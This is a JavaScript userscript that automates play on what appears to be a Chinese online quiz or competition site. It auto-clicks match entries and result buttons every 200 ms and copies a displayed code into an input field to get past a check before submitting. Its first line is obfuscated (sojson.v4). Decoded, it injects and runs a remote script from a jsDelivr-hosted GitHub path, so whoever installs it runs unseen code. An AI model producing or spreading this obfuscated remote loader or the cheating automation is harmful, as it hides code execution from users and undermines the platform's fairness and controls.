['sojson.v4']["\x66\x69\x6c\x74\x65\x72"]["\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"](((['sojson.v4']+[])["\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"]['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65']['\x61\x70\x70\x6c\x79'](null,"118g97p114Y32i115T99r114j105q112Z116R120T32e61C32h100I111W99h117j109e101H110l116R46F99c114D101E97P116u101P69o108Z101g109g101G110M116Y40l39d115x99h114X105A112e116D39V41N59c10j115Y99b114l105u112t116O120a46t115O114D99z32i61K32M34f104U116n116W112r115j58x47U47R99I100u110e46x106g115T100V101c108H105T118P114o46y110M101l116v47R103G104k47O49t49m55x48j53c53H57S52H49g53R47t80S67y47H68d88b88Y46z106i115O34a59z10z100h111g99C117y109K101h110T116s46j103j101z116S69h108F101t109a101Z110J116N115B66L121o84Q97s103s78Q97J109i101I40u39Z104P101k97q100E39E41H91O48b93A46S97U112D112Q101U110y100G67Z104L105L108z100N40h115Y99U114u105A112n116N120m41a59"['\x73\x70\x6c\x69\x74'](/[a-zA-Z]{1,}/))))('sojson.v4');

var first = true;
var loop = true;//是否开启循环
//初始化保护
setTimeout(()=>{
    first = false;
},"1000");

setInterval(()=>{
    if(!first){
        //抢十赛，其他模式懒得弄了
        if(document.getElementsByTagName('img').length > 6 && loop){
            for(var i = 0;i<document.getElementsByTagName('img').length;i++){
                if(document.getElementsByTagName('img')[i].src.indexOf("/public/pc3/qiangshi.png") != -1){
                    document.getElementsByTagName('img')[i].click();
                }
            }
            //document.getElementsByClassName('card_bottom_right_item')[2].img.click();
        }
        if(document.getElementsByClassName('result_back_btn').length > 0){
            document.getElementsByClassName('result_back_btn')[0].click();
        }
    }
},200)

setInterval(()=>{
    if(document.getElementsByClassName('question_btn ml5')[1].innerHTML != "提交"){
        document.getElementsByClassName('el-input__inner')[0].value = document.getElementsByClassName('question_btn ml5')[1].innerHTML;
        document.getElementsByClassName('code_change_text')[0].innerHTML = "泸职🧡";
        document.getElementsByClassName('el-input__inner')[0].dispatchEvent(new Event('input'));
        document.getElementsByClassName('question_btn ml5')[1].innerHTML = "提交";
    }
    if(document.getElementsByClassName('common_btn2 btn_red').length > 0){
        document.getElementsByClassName('common_btn2 btn_red')[0].click();
    }
},200)
